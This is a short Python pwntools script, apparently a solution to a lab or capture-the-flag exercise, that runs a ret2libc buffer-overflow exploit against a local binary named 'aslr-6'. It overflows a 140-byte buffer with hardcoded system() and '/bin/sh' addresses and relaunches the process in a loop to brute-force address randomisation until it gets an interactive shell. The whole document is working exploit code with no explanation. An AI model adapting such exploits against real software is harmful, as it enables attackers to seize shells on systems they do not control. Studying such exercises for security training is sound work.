#!/usr/bin/env python
from pwn import *

system_addr = 0xb7e757e0
sh_addr = 0xb7f20a10
buffer = "A"*140 + p32(system_addr) + "AAAA" + p32(sh_addr) + p32(0) + p32(0)

while True:
    p = process("./aslr-6")
    p.sendline(buffer)
    p.interactive()
    p.close()
